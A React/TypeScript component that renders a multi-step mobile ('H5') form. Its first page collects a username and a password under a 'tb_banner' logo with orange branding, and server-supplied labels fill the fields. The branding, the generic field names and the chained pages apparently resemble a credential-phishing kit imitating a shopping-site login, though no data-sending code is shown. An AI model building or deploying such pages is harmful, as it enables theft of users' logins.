import { useEffect, useMemo } from "react";
import { Form, Input, Button, Image, Radio } from "antd";
import { useModuleData } from "./moduleContext";
import { Page4, Page2, Page3, Page5, Page6, Page9, Page12 } from "../pages";
import { useH5Store } from "../store";
import clsx from "clsx";


export const ITEM_KEYS = ["item1", "item8"] as const;

// 2026-09-22 02:30:00 CST：module4 统一复用 module2 的页面渲染和独立提交结构。
// 触发场景：后续页面通过 key 切换时，需要由 PAGE_ITEM_KEYS 决定当前页面提交哪些字段。
// 维护注意：新增或调整 module4 页面字段时只修改本文件的 PAGE_ITEM_KEYS，不要直接改 H5 路由层。
export const PAGE_ITEM_KEYS: Record<string, readonly string[]> = {
  key1: ["item1", "item8"],
  key2: ["item2"],
  key3: ["item2"],
  key4: ["item2"],
  key5: ["item5"],
  key6: ["item2"],
  key7: ["item4", "item7"],
  key8: ["item2"],
  key9: ["item2"],
  key10: ["item2"],
  key11: ["item2"],
  key12: ["item4", "item7"],
  key13: ["item2"],
  key14: ["item2"],
};

export default function Module4Page() {
  const { key, moduleInfo, canSubmit, submitting, submit, itemKeys, onValueChange, values } = useModuleData();
  const isSubmitDisabled = submitting || !canSubmit;
  const { setMmoduleInfo, infoArr, setInfoArr } = useH5Store();

  const styleBorder: string = useMemo(() => 'border-b border-gray-700', []);

  useEffect(() => {
    setMmoduleInfo(moduleInfo);
    document.title = moduleInfo.siteTitle || "";
    setInfoArr(moduleInfo.title.split("|"));
  }, [moduleInfo, setInfoArr, setMmoduleInfo]);

  return (
    <>
      {key === "key1" && (
        <main className="h-screen w-screen  bg-[#1a1a1a] p-10 text-sm flex flex-col items-center" data-module="module4">
          <Image src="/t/tb_banner.png" className="w-[120px] h-[40px] my-10"></Image>
          <Form layout="vertical" onFinish={submit} className="mx-auto w-full max-w-xl">
            {itemKeys.map((itemKey, index) => (
              <Form.Item key={itemKey} noStyle>
                <div className={clsx("flex w-full bg-[#2d2d2d] ", styleBorder)}>
                  <div className="flex w-[80px] shrink-0 items-center justify-center text-sm font-medium text-[#f5f5f5]">{infoArr[index]}</div>
                  <Input
                    type={itemKey === "item8" ? "password" : "text"}
                    variant="borderless"
                    placeholder={`请填写${infoArr[1 + index]}`} bordered={false}
                    value={values[itemKey] ?? ""}
                    onChange={(event) => onValueChange(itemKey, event.target.value)}
                    className="text-[18px] text-[#f5f5f5] placeholder:text-[#666] h-[3rem]"
                  />
                </div>
              </Form.Item>
            ))}
            <Form.Item noStyle>
              <div className="flex flex-col items-center mt-8 gap-y-4">
                <Button
                  className={`${isSubmitDisabled ? "!text-[#b8b8b8] bg-gray-100" : "!text-white bg-[#ff5000]"} my-4  w-full h-[40px] text-[15px] font-bold `}
                  type="primary"
                  variant="solid"
                  htmlType="submit"
                  disabled={isSubmitDisabled}
                >
                  {infoArr[4]}
                </Button>
              </div>
            </Form.Item>
          </Form>
          <div className="w-full text-sm my-2 text-gray-400"><Radio checked></Radio>
            {infoArr[5]}
            <span className="text-red-500 cursor-pointer mx-1">{infoArr[6]}</span>
            {infoArr[7]}
          </div>
        </main>
      )}
      {key === "key4" && <Page4 />}
      {key === "key2" && <Page2 />}
      {key === "key3" && <Page3 />}
      {key === "key5" && <Page5 />}
      {key === "key6" && <Page6 />}
      {key === "key10" && <Page9 />}
      {key === "key12" && <Page12 />}
    </>
  );
}

